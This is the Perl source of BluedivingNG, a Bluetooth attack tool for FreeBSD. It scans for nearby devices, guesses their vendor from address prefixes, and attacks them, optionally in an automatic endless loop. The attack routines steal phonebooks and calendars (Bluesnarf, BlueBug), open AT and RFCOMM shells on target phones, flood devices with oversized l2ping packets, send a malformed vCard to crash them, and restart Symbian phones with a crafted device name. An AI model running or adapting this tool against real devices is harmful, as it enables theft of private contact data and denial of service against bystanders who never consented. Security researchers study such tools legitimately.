#!/usr/bin/perl
#
# Bluediving - Hacking Bluetooth enabled devices.
# FreeBSD port
#
# Programmed by Bastian Ballmann
# Web: http://www.datenterrorist.de
# Mail: Balle@chaostal.de
#
# First version: Mon Jan 10 10:28:26 CET 2005
# NG version: Tue Jun 28 18:17:21 CEST 2005
# Last update: Fri May 12 21:48:02 CEST 2006
#
# License: GPL version 2
#
# ...there is no spoon.

###[ Loading modules ]###

use Env qw(PATH,IFS);
use XML::Simple;
use strict;


###[ Configuration ]###

die "$0 [device]\n" if $ARGV[0] eq "--help";

my %preferences;
my $configfile = "bluedivingNG_bsd.conf";

my $cfg = XMLin($configfile) or die "Cannot read config file $configfile!\n$!\n";

# Device
$preferences{'device'} = $cfg->{'device'};
$preferences{'device'} = $ARGV[0] if defined $ARGV[0];
$preferences{'device'} = "ubt0" if $preferences{'device'} eq "";

# Where to keep logs?
$preferences{'logdir'} = $cfg->{'logdir'};

# Main logfile
$preferences{'logfile'} = $preferences{'logdir'} . $cfg->{'logfile'};

# Play sound?
# 1 == yes / 0 == no
$preferences{'play_sound'} = $cfg->{'play_sound'};

# Sound file
$preferences{'sound_file'} = $cfg->{'sound_file'};

# My nasty vcard
$preferences{'vcard'} = $cfg->{'vcard'};

# Default channel
$preferences{'channel'} = $cfg->{'channel'};

# Default device name
$preferences{'device_name'} = $cfg->{'device_name'};

# Default device type
# Phone, Laptop
$preferences{'device_type'} = $cfg->{'device_type'};

# Should the device be visible?
# 0 == no / 1 == yes
$preferences{'device_visibility'} = $cfg->{'device_visibility'};

# Clear environment
$ENV{'PATH'} = "/usr/bin:/usr/sbin:.";
$ENV{'IFS'} = "/";



###[ MAIN PART ]###

# Specific device logdir
my $devicedir = "";

# Remember seen devices
my %seen;

# New devices found on the air
my @new_devices;

# My target device
my $target;

# My last menu
my $last_menu;

# My last RFCOMM device
my $rfcomm_device = 0;

# Dont print menu?
my $no_menu = 0;

# Device type map
my %device_type = ("phone" => "00:02:04",
		   "laptop" => "00:01:0c");

# Vendor map
my %vendor = ("0" => "Unknown",
	      "1" => "Nokia",
	      "2" => "Ericsson",
	      "3" => "Motorola",
	      "4" => "Siemens",
	      "5" => "HP",
	      "6" => "ACER",
	      "7" => "Apple");

# Init program
init_program();

# Print header
my $muh = "BluedivingNG (BETA Version)"; 
print "\n" . $muh . "\n";
print "-" x length($muh) . "\n\n";
print "Next generation bluetooth security tool.\n";
print "Programmed by Bastian Ballmann\n";

# Go get it
while(1){ print_mainmenu(); }



###[ MENU SUBROUTINES ]###

# Print menu and handle user input
sub print_menu
{
    my @menu = @_;

    print "\n". "-="x25 . "-\n";

    # Menu name
    print "$menu[0]\n\n";

    # Print the menu
    for(my $i=1; $i<scalar(@menu); $i++)
    {
	print "[$i] " . $menu[$i]->[0] . "\n";
    }

    print "-="x25 . "-\n\n";

    # Get user input
    print ">>> ";
    my $input = <STDIN>;
    chomp $input;

    # Check user input
    exit_program() if(($input eq "exit") || ($input eq "quit"));
    &{$last_menu} if $input eq "";
    die "Go home.\n" unless $input =~ /\d/;

    if(($input > scalar(@menu)-1) || ($input == 0))
    {
	print "<<< ERROR! Undefined input.\n";
	&{$last_menu};
    }
    else
    {
	# Execute the command
	print "\n";
	&{$menu[$input]->[1]};
    }
}

# Print the main menu
sub print_mainmenu
{
    my @menu = ('[MAIN MENU]',
		['Scan', \&scan],
		['Scan and attack', \&scan_and_attack],
		['Scan and attack (endless loop)', \&loop_scan_and_attack],
		['Info Menu', \&print_infomenu],
		['Action Menu', \&print_actionmenu],
		['Change preferences', \&change_preferences],
		['Show preferences', \&show_preferences],
		['Show logfile', \&print_logfile],
		['Exit', \&exit_program]);

    $last_menu = \&print_mainmenu;
    print_menu(@menu);
}

# Print Info menu
sub print_infomenu
{
    my @menu = ('[INFO MENU]',
		['Choose a target', \&get_a_target],
		['Get info', \&get_device_info],
		['Get services', \&get_device_services],
		['Find service', \&find_service],
		['Get vendor', \&get_device_vendor],
		['Check connection', \&check_connection],
		['Show new devices', \&show_new_devices],
		['Show all devices', \&show_all_devices],
		['Action menu', \&print_actionmenu],
		['Main menu', \&print_mainmenu],
		['Exit', \&exit_program]);

    $last_menu = \&print_infomenu;
    print_menu(@menu);
}

# Print action menu
sub print_actionmenu
{
    my @menu = ('[ACTION MENU]',
		['Choose a target', \&get_a_target],
		['Blue Snarf', \&bluesnarf],
		['Blue Snarf++', \&bluesnarf2],
		['Blue Snarf Ericsson', \&bluesnarf_ericsson],
		['Blue Bug', \&bluebug],
		['Blue Bug AT shell', \&bluebug_atshell],
		['Helo Moto', \&helomoto],
		['Blue Smack', \&bluesmack],
		['Stop Blue Smack', \&stop_bluesmack],
		['Nasty VCard', \&send_nasty_vcard],
		['Symbian Remote Restart', \&symbian_remote_restart],
		['Try all attacks', \&try_all_attacks],
		['Automatic attack', \&attack],
#		['Launch redfang', \&launch_redfang],
#		['Change your bluetooth address', \&change_btaddr],
#		['Send soundfile', \&send_sound],
		['Scan RFCOMM channels', \&rfcomm_scan],
		['Launch RFCOMM shell', \&launch_rfcomm_shell],
		['RFCOMM Connection', \&rfcomm_connection],
		['HCI Connection', \&hci_connection],
#		['Request new link key', \&request_paiting],
		['Info menu', \&print_infomenu],
		['Main menu', \&print_mainmenu],
		['Exit', \&exit_program]);

    $last_menu = \&print_actionmenu;
    print_menu(@menu);
}

# Choose a target from the new devices list
sub get_a_target
{
    my @devices;

    print "Want to see all devices? <y/N>: ";
    my $input = <STDIN>;
    chomp $input;

    if($input eq "y")
    {
	my $i = 1;

	while(my($key,$value) = each %seen)
	{
	    push @devices, $key;
	    print "[$i] $key $value\n";
	    $i++;
	}
    }
    else
    {
	show_new_devices();
	@devices = @new_devices;
    }

    # Get user input
    print ">>> ";
    $input = <STDIN>;
    chomp $input;

    # Check user input
    exit_program() if(($input eq "exit") || ($input eq "quit"));
    die "Go home.\n" unless $input =~ /\d/;

    if(($input > scalar(@devices)) || ($input == 0))
    {
	print "<<< ERROR! Undefined input.\n";
	print_mainmenu();
    }

    $target = $devices[$input];    
    &{$last_menu} unless $no_menu;
}

# Find the channel for a service
sub find_channel
{
    if($target eq "")
    {
	print "<<< I need a target!\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    print "Service: ";
    my $input = <STDIN>;
    chomp($input);

    die "Go home.\n" unless $input =~ /^\w+/;
    my $channel = get_channel($target, $input);

    if($channel == 0)
    {
	print "Can't find service $input\n";
    }
    else
    {
	print "Service $input is on channel $channel.\n";
    }

    &{$last_menu} unless $no_menu;
}

# Try browse SDP to get the channel for a service
# Parameter: addr, service
# Return: channelnr
sub get_channel
{
    my ($addr,$service) = @_;
    my $flag = 0;
    my $channel = 0;

    return unless (defined $addr) && (defined $service);

    open(SDP,"$cfg->{'sdpcontrol'} -a $target browse |") or die $!;

    while(<SDP>)
    {
	$flag = 1 if($_ =~ /Service name: $service/ig);	
	if(($flag == 1) && ($_ =~ /Channel: (\d+)/))
	{
	    $channel = $1;
	    last;
	}
    }

    close(SDP);
    return $channel;
}

# Ask the user to change the default channel
sub ask_channel
{
    print "Default channel is $preferences{'channel'}\n";
    print "Want to change it? (y/N): ";
    
    my $input = <STDIN>;
    chomp $input;
    
    if($input eq "y")
    {
	print "Tell me the channel number: ";
	
	$input = <STDIN>;
	chomp $input;
	
	die "Go home." unless $input =~ /\d{1,2}/;
	$preferences{'channel'} = $input;
    }
}



###[ NORMAL SUBROUTINES ]###

# Scan for new devices
sub scan
{
    @new_devices = ();
    my ($host,$addr);

    # Scan for new devices
    print "<<< Start scanning for bluetooth devices...\n";
    open(HCI,"$cfg->{'hccontrol'} -n $preferences{'device'}hci inquiry|") or die "$!\n";
    
    while(<HCI>)
    {
	if($_ =~ /BD\_ADDR\: (\w\w\:\w\w\:\w\w\:\w\w\:\w\w\:\w\w)/)
	{
	    $addr = $1;
	    
	    open(HCI,"$cfg->{'hccontrol'} -n $cfg->{'device'}hci remote_name_request $addr|");
	    my @host = <HCI>;
	    close(HCI);

	    if($host[0] =~ /timeout/)
	    {
		$host = 'n/a';
	    }
	    elsif($host[1] =~ /Name\: (.+)/)
	    {
		$host = $1;
	    }
	}
	
	# Found a new device
	if( ($host ne "") && ($addr ne "") && ($seen{$addr} eq "") )
	{
	    print "<<< " . localtime(time) . " Found host $host addr $addr\n";
	    print LOG localtime(time) . " Found host $host addr $addr\n";
	    $seen{$addr} = $host;
	    
	    $devicedir = $preferences{'logdir'} . $addr;
	    unlink($devicedir) if -e $devicedir;
	    mkdir($devicedir);
	    
	    # Play sound?
	    system("$cfg->{'play'} $preferences{'sound_file'} > /dev/null 2> /dev/null") if $preferences{'play_sound'};
	    
	    push @new_devices,$addr;
	}
    }

    close(HCI);

    if(scalar(@new_devices) == 0)
    {
	print "<<< Found no devices.\n";
    }
    else
    {
	$target = $new_devices[0];
    }
}

# Show new devices
sub show_new_devices
{
    if(scalar(@new_devices) > 0)
    {
	for(my $i=1; $i<scalar(@new_devices); $i++)
	{
	    print "[$i] $new_devices[$i] $seen{$new_devices[$i]}\n";
	}
    }
    else
    {
	print "<<< There are no new devices.\n";
    }
}

# Show all devices
sub show_all_devices
{
    my $flag = 1;
    
    while(my($key,$value) = each %seen)
    {
	print "[$flag] $key\n";
	$flag++;
    }

    print "<<< No devices at all...\n" if $flag == 1;
}

# Scan RFCOMM channels
sub rfcomm_scan
{
    my $start = 1;
    my $end = 20;

    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    print "From ($start): ";
    my $input = <STDIN>;
    chomp $input;
    
    if($input ne "")
    {	    
	die "Go home." unless $input =~ /^\d+$/;
	$start = $input;
    }
    
    print "To ($end): ";
    $input = <STDIN>;
    chomp $input;
    
    if($input ne "")
    {	    
	die "Go home." unless $input =~ /^\d+$/;
	$end = $input;
    }
    
    print "Start scanning $target from $start to $end\n";
    
    for(my $i=$start; $i<=$end; $i++)
    {
	print "Trying to connect to channel $i\n";
	system("$cfg->{'rfcomm_sppd'} -a $target -c $i");
	$rfcomm_device++;	    
    }
    
#    system("$cfg->{'rfcomm'} -i $preferences{'device'} release all");
    $rfcomm_device = 0;

    &{$last_menu} unless $no_menu;
}

# Launch RFCOMM shell
sub launch_rfcomm_shell
{
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }
    
    ask_channel();
    print "<<< Trying to connect to RFCOMM channel $preferences{'channel'} on $target\n";
    system("$cfg->{'rfcomm_shell'} $target $preferences{'channel'}");
}

# Make a RFCOMM connection
sub rfcomm_connection
{
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    ask_channel();

    print "<<< Trying to connect to $target:$preferences{'channel'}\n";
    system("$cfg->{'rfcomm_sppd'} -a $target -c $preferences{'channel'}");
    &{$last_menu} unless $no_menu;
}

# Make a HCI connection
sub hci_connection
{
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    print "<<< Trying a HCI connection to $target\n";
    system("$cfg->{'hccontrol'} -n $cfg->{'device'}hci create_connection $target");
    &{$last_menu} unless $no_menu;
}



###[ ATTACK SUBROUTINES ]###

# Scan and attack
sub scan_and_attack
{
    scan();
    attack();
    &{$last_menu};
}

# Scan and attack in an endless loop
sub loop_scan_and_attack 
{ 
    $no_menu = 1;

    while(1) 
    { 
	scan();
	attack(); 
	sleep 1;
    } 
}

# Attack new devices
sub attack
{
    for(@new_devices)
    {
	my $id = get_device_vendor($_);
	$target = $_;

	# Nokia
	if($vendor{$id} eq "Nokia")
	{
	    bluesnarf();
	}

	# Ericsson
	elsif($vendor{$id} eq "Ericsson")
	{
	    bluesnarf_ericsson();
	}

	# Motorola
	elsif($vendor{$id} eq "Motorola")
	{
	    bluebug();
	}

	# Another vendor
	else
	{
	    send_nasty_vcard();
#	    bluesmack();
	}
    }
}



###[ INFO SUBROUTINES ]###

# Get available infos
sub get_device_info
{
    my $got_info = 0;
    $devicedir = $preferences{'logdir'} . $target;
    
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    die "FATAL! $devicedir/info is a symbolic link!\n" if -l ("$devicedir/info");

    open(INFO,"$cfg->{'hccontrol'} -n $cfg->{'device'}hci read_remote_supported_features $target > $devicedir/info |");
    my @info = <INFO>;
    close(INFO);

    if(scalar(@info) > 0)
    {
    	map { print; } @info;
	$got_info++;
    }

    open(INFO,"$cfg->{'hccontrol'} -n $cfg->{'device'}hci read_remote_version_information $target >> $devicedir/info |");
    @info = <INFO>;
    close(INFO);

    if(scalar(@info) > 0)
    {
    	map { print; } @info;
	$got_info++;
    }

    if($got_info == 0)
    {
    	print "<<< No info available for $target\n";
    }

    &{$last_menu};
}

# Get available services
sub get_device_services
{
    $devicedir = $preferences{'logdir'} . $target;
    
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    die "FATAL! $devicedir/services is a symbolic link!\n" if -l ("$devicedir/services");
    open(SDP,"$cfg->{'sdpcontrol'} -a $target browse > $devicedir/services |");
    my @sdp = <SDP>;
    close(SDP);

    if(scalar(@sdp) == 0)
    {
    	print "<<< Target $target seems to have no running sdp daemon.\n";
    }
    else
    {
    	map { print; } @sdp;
    }

    &{$last_menu};
}

# Detect device vendor
# 0 -> Unkown
# 1 -> Nokia
# 2 -> Ericsson
# 3 -> Motorola
# 4 -> Siemens
# 5 -> HP
# 6 -> Acer
# 7 -> Apple
sub get_device_vendor
{
    my $code = 0;

    # Is it a mobile phone? Which one? Check first three byte of address!
    # Try to retrieve data from the phone!
    if (($target =~ /^00:60:57/) || ($target =~ /^00:02:EE/) || ($target =~ /^00:0E:ED/) || ($target =~ /^00:11:9F/) || ($target =~ /^00:60:57/))
    {
	print "<<< " . localtime(time) . " $target is a Nokia mobile phone.\n";
	print LOG localtime(time) . " $target is a Nokia mobile phone.\n";
	$code = 1;
    }
    
    elsif (($target =~ /^00:01:EC/) || ($target =~ /^00:0A:D9/) || ($target =~ /^00:0E:07/))
    {
	print "<<< " . localtime(time) . " $target is an Ericsson mobile phone.\n";
	print LOG localtime(time) . " $target is an Ericsson mobile phone.\n";
	$code = 2;
    }
    
    elsif (($target =~ /^C6:F7:4A/) || ($target =~ /^00:0A:28/))
    {
	print "<<< " . localtime(time) . " $target is a Motorola mobile phone.\n";
	print LOG localtime(time) . " $target is a Motorola mobile phone.\n";
	$code = 3;
    }
    
    elsif (($target =~ /^00:01:E3/) || ($target =~ /^01:90:71/))
    {
	print "<<< " . localtime(time) . " $target is a Siemens mobile phone.\n";
	print LOG localtime(time) . " $target is a Siemens mobile phone.\n";
	$code = 4;
    }

    elsif($target =~ /^08:00:28/)
    {
	print "<<< " . localtime(time) . " $target is a HP iPAQ.\n";
	print LOG localtime(time) . " $target is a HP iPAQ.\n";
	$code = 5;
    }

    elsif($target =~ /^00:02:78/)
    {
	print "<<< " . localtime(time) . " $target is an ACER device.\n";
	print LOG localtime(time) . " $target is an ACER device.\n";
	$code = 6;
    }

    elsif($target =~ /^00:0A:95/)
    {
	print "<<< " . localtime(time) . " $target is an Apple device.\n";
	print LOG localtime(time) . " $target is an Apple device.\n";
	$code = 7;
    }

    else
    {
	print "<<< " . localtime(time) . " $target is from an unkown vendor.\n";
	print LOG localtime(time) . " $target is from an unkown vendor.\n";
    }

    &{$last_menu};
    return $code;
}

# Check the connection with a single l2cap packet
sub check_connection
{
    $devicedir = $preferences{'logdir'} . $target;
    
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    print "<<< Checking connection of $target\n";
    open(L2PING,"$cfg->{'l2ping'} -c 1 -a $target |");
    while(<L2PING>){ print; }
    close(L2PING);
    &{$last_menu};
}

# Get local device name
sub get_device_name
{
    my $name = "unkown";

    open(HCI,"$cfg->{'hccontrol'} -n $preferences{'device'}hci read_local_name |") or die $!;

    while(<HCI>)
    {
	$name = $1 if $_ =~ /Local name: \'(.*)\'/i;
    }

    close(HCI);
    return $name;
}

# Set local device name
sub set_device_name
{
    my $name = shift;
    
    if($name eq "")
    {
	print "<<< I need a device name to set!\n";
    }
    else
    {
	print "<<< Setting device name to $name\n";
	system("$cfg->{'hccontrol'} -n $preferences{'device'}hci change_local_name '$name'");
    }
}

# Set device type
sub set_device_type
{
    my $name = shift;
    my $hex = $device_type{lc($name)};

    if($hex eq "")
    {
	print "<<< Unsupported device type\n";
    }
    else
    {
	print "<<< Setting device type to $name\n";
	system("$cfg->{'hccontrol'} -n $preferences{'device'}hci write_class_of_device $hex");
    }
}

# Set device visibility
sub set_device_visibility
{
    # Unvisible
    if($preferences{'device_visibility'} == 0)
    {
	print "<<< Setting device to non-visible mode\n";
	system("$cfg->{'hccontrol'} -n $preferences{'device'}hci write_scan_enable 0");
    }
    
    # Visible
    elsif($preferences{'device_visibility'} == 1)
    {
	print "<<< Setting device to visible mode\n";
	system("$cfg->{'hccontrol'} -n $preferences{'device'}hci write_scan_enable 3");
    }
}


###[ EXPLOIT STUFF ]###

# Blue Snarf attack
sub bluesnarf
{
    $devicedir = $preferences{'logdir'} . $target;
    
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    $preferences{'channel'} = get_channel($target,"OBEX Object Push");
    ask_channel() if ($preferences{'channel'} == 0) || ($preferences{'channel'} eq "");
    
    unlink("$devicedir/phonebook") if -e ("$devicedir/phonebook");
    unlink("$devicedir/calendar") if -e ("$devicedir/calendar");
    
    print "<<< Bluesnarfing $target.\n";
    system("$cfg->{'obexapp'} -a $target -C 17");
    system("$cfg->{'obexapp'} -a $target -C 18");
    
    if($preferences{'channel'} ne "17" && $preferences{'channel'} ne "18")
    {
        system("$cfg->{'obexapp'} -a $target -C $preferences{'channel'}");
    }

    &{$last_menu} unless $no_menu;
}

# Blue Snarf++
sub bluesnarf2
{
    $devicedir = $preferences{'logdir'} . $target;
    $preferences{'channel'} = 10;
    
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    # FIXME
    $preferences{'channel'} = get_channel($target,"OBEX Object Push");
    ask_channel() if $preferences{'channel'} == 0;
    print "<<< Launching BlueSnarf++ on $target:$preferences{'channel'}\n";
    system("$cfg->{'btftp'} $target $preferences{'channel'}");
    &{$last_menu} unless $no_menu;
}

# Blue Bug
sub bluebug
{
    $devicedir = $preferences{'logdir'} . $target;
    
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    ask_channel();
    unlink("$devicedir/phonebook") if -e ("$devicedir/phonebook");
    print "Bluebugging $target:$preferences{'channel'}\n";
    system("$cfg->{'attest'} $target $preferences{'channel'} > $devicedir/phonebook");
    
    die "FATAL! $devicedir/phonebook is a symbolic link!\n" if -l ("$devicedir/phonebook");
    open(IN,"<$devicedir/phonebook");
    my @input = <IN>;
    close(IN);
    
    if(scalar(@input) == 0)
    {
	print "<<< No phonebook received.\n";
    }
    else
    {
	map{print;}@input;
    }

    &{$last_menu} unless $no_menu;
}

# Get a BlueBug AT Shell
sub bluebug_atshell
{
    $devicedir = $preferences{'logdir'} . $target;

    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    ask_channel();
    print "<<< Trying to get a BlueBug AT shell on $target:$preferences{'channel'}\n";
    system("$cfg->{'atshell'} $target $preferences{'channel'}");
    &{$last_menu} unless $no_menu;
}

# Blue Smack
sub bluesmack
{
    $devicedir = $preferences{'logdir'} . $target;
    
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    print "<<< Bluesmacking $target\n";
    system("$cfg->{'l2ping'} -f -s 667 -a $target >/dev/null \&");
    &{$last_menu} unless $no_menu;
}

# Stop Bluesmack attack
sub stop_bluesmack
{
    system("killall l2ping 2> /dev/null");
    &{$last_menu} unless $no_menu;
}

# Try to dos the device by sending a nasty vcard
sub send_nasty_vcard
{
    $devicedir = $preferences{'logdir'} . $target;
    
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    print "<<< Sending a nasty vcard to $target\n";
    $preferences{'channel'} = get_channel($target,"OBEX Object Push");
    system("$cfg->{'obexapp'} -a $target -C $preferences{'channel'} -n put $preferences{'vcard'}");
    &{$last_menu} unless $no_menu;
}

# Helo moto attack (motorola)
sub helomoto
{
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    $preferences{'channel'} = get_channel($target,"OBEX Object Push");
    ask_channel() if ($preferences{'channel'} == 0) || ($preferences{'channel'} eq "");
    print "<<< Launching Helo Moto attack on $target:$preferences{'channel'}\n";
    print "<<< Opening RFCOMM connection to $target:$preferences{'channel'}\n";
    system("$cfg->{'rfcomm'} -a $target -c $preferences{'channel'} &");	
    sleep 2;
    print "<<< Trying to launch AT shell on channel 3\n";
    system("$cfg->{'atshell'} $target 3");	
    print "Closing RFCOMM connection.\n";
#    system("$cfg->{'rfcomm'} -i $preferences{'device'} release $rfcomm_device");
    &{$last_menu} unless $no_menu;
}

# Blue Snarf an ericsson phone
sub bluesnarf_ericsson
{
    $devicedir = $preferences{'logdir'} . $target;
    
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    unlink("$devicedir/phonebook") if -e ("$devicedir/phonebook");
    print "<<< Bluesnarfing $target (ericsson mode)\n";
    system("$cfg->{'obexapp'} -a $target -C 10 -n get telecom/pb.vcf > $devicedir/phonebook");
    
    die "FATAL! $devicedir/phonebook is a symbolic link!\n" if -l ("$devicedir/phonebook");
    open(IN,"<$devicedir/phonebook");
    my @input = <IN>;
    close(IN);
    
    if(scalar(@input) == 0)
    {
	unlink("$devicedir/phonebook") if -e ("$devicedir/phonebook");
	system("$cfg->{'attest'} $target 17 > $devicedir/phonebook");
	
	die "FATAL! $devicedir/phonebook is a symbolic link!\n" if -l ("$devicedir/phonebook");
	open(IN,"<$devicedir/phonebook");
	my @input = <IN>;
	close(IN);
	
	if(scalar(@input) == 0)
	{
	    print "<<< No phonebook received.\n";
	}
	else
	{
	    map{print;}@input;
	}
    }
    else
    {
	map{print;}@input;
    }

    &{$last_menu} unless $no_menu;
}

# A Symbian OS restarts if it gets in touch with a device
# name including a 090a in hex
sub symbian_remote_restart
{
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    my $oldname = get_device_name();
    set_device_name($oldname . "\x09\x0a");
    print "<<< Launching Symbian Remote Restart attack on $target\n";
    check_connection();
    sleep 1;
    check_connection();
    set_device_name($oldname);
    &{$last_menu} unless $no_menu;
}

# Try all attacks on a single device
sub try_all_attacks
{
    $no_menu = 1;

    if($target eq "")
    {
	print "<<< I need a target.\n";
	get_a_target();
    }

    bluesnarf();
    bluesnarf2();
    bluesnarf_ericsson();
    bluebug();
    helomoto();
    bluesmack();
    send_nasty_vcard();
    symbian_remote_restart();

    $no_menu = 0;
    &{$last_menu};
}


###[ HARMLESS SUBROUTINES ]###

# Check filenames
sub check_preferences
{
    die "Check logdir.\n" unless $preferences{'logdir'} =~ /[a-zA-Z0-9\/]/g;
    die "Check logfile.\n" unless $preferences{'logfile'} =~ /[a-zA-Z0-9\/\.]/g;
    die "Check sound file.\n" unless $preferences{'sound_file'} =~ /[a-zA-Z0-9\/\.]/g;
    die "Check channel.\n" unless $preferences{'channel'} =~ /^\d+$/;
    die "Check device name.\n" unless $preferences{'device_name'} =~ /[a-zA-Z0-9]/g;
}

# Print out the main logfile
sub print_logfile
{
    die "FATAL! $preferences{'logfile'} is a symbolic link!\n" if -l $preferences{'logfile'};
    open(IN,"<$preferences{'logfile'}") or die "Cannot read $preferences{'logfile'}!\n";    
    while(<IN>) { print; }
    close(IN);
}

# Change preferences
sub change_preferences
{
    my $oldlogfile = $preferences{'logfile'};
    my $olddevicename = $preferences{'device_name'};
    my $olddevicetype = $preferences{'device_type'};
    my $olddevicevisibility = $preferences{'device_visibility'};

    while(my ($key,$value) = each %preferences)
    {
	print "$key: $value\n";
	print "Change it? <y/N>: ";
	my $input = <STDIN>;
	chomp $input;

	if($input eq "y")
	{
	    print ">>> ";
	    $input = <STDIN>;
	    chomp $input;
	    $preferences{$key} = $input;
	}
    }

    check_preferences();

    if($preferences{'logfile'} ne $oldlogfile)
    {
	close(LOG);
	unlink($preferences{'logfile'}) if -l $preferences{'logfile'};
	open(LOG,">>$preferences{'logfile'}") or die "Cannot write to $preferences{'logfile'}!\n$!\n";
    }

    if($preferences{'device_name'} ne $olddevicename)
    {
	set_device_name($preferences{'device_name'});
    }

    if(lc($preferences{'device_type'}) ne lc($olddevicetype))
    {
	set_device_type($preferences{'device_type'});
    }

    if($preferences{'device_visibility'} != $olddevicevisibility)
    {
	set_device_visibility();
    }

    &{$last_menu};
}

# Show preferences
sub show_preferences
{
    print "<<< Current settings are:\n\n";

    while(my ($key,$value) = each %preferences)
    {
	print "$key: $value\n";
    }

    &{$last_menu};
}

# Initialize everything we need
sub init_program
{
    # Got r00t?
    die "You should have EUID 0 to use this tool.\n" if($> != 0);    

    # Check filenames
    check_preferences();

    # Check binaries
    die "Missing or non-executable binary rc.bluetooth $cfg->{'rcbluetooth'}.\n" unless -x $cfg->{'rcbluetooth'};
    die "Missing or non-executable binary hccontrol $cfg->{'hccontrol'}.\n" unless -x $cfg->{'hccontrol'};
    die "Missing or non-executable binary sdpcontrol $cfg->{'sdpcontrol'}.\n" unless -x $cfg->{'sdpcontrol'};
    die "Missing or non-executable binary l2ping $cfg->{'l2ping'}.\n" unless -x $cfg->{'l2ping'};
    die "Missing or non-executable binary rfcomm_sppd $cfg->{'rfcomm_sppd'}.\n" unless -x $cfg->{'rfcomm_sppd'};
    die "Missing or non-executable binary rfcomm_shell $cfg->{'rfcomm_shell'}.\n" unless -x $cfg->{'rfcomm_shell'};
    die "Missing or non-executable binary obexapp $cfg->{'obexapp'}.\n" unless -x $cfg->{'obexapp'};
    die "Missing or non-executable binary attest $cfg->{'attest'}.\n" unless -x $cfg->{'attest'};
    die "Missing or non-executable binary atshell $cfg->{'atshell'}.\n" unless -x $cfg->{'atshell'};
    die "Missing or non-executable binary play $cfg->{'play'}.\n" unless -x $cfg->{'play'};
    
    # Initialize device
    system(HCI,"$cfg->{'rcbluetooth'} start $preferences{'device'} 2>/dev/null|");
    die "$cfg->{'rcbluetooth'} start $preferences{'device'} failed!\n$!\n" if $? == 1;

    # Set the device name
    set_device_name($preferences{'device_name'});
    
    # Set the device type
    set_device_type($preferences{'device_type'});

    # Set device visibility
    set_device_visibility();

    # Check if logdir exists    
    mkdir($preferences{'logdir'}) unless(-d $preferences{'logdir'});

    # Open logfile
    unlink($preferences{'logfile'}) if -l $preferences{'logfile'};
    open(LOG,">>$preferences{'logfile'}") or die "Cannot write to $preferences{'logfile'}!\n$!\n";
}

# Just clean up and exit
sub exit_program
{
    $no_menu = 1;
    stop_bluesmack();
#    system("$cfg->{'rfcomm'} -i $preferences{'device'} release all");
    close(LOG);
    exit(0);
}

# Mmmm... EOF.
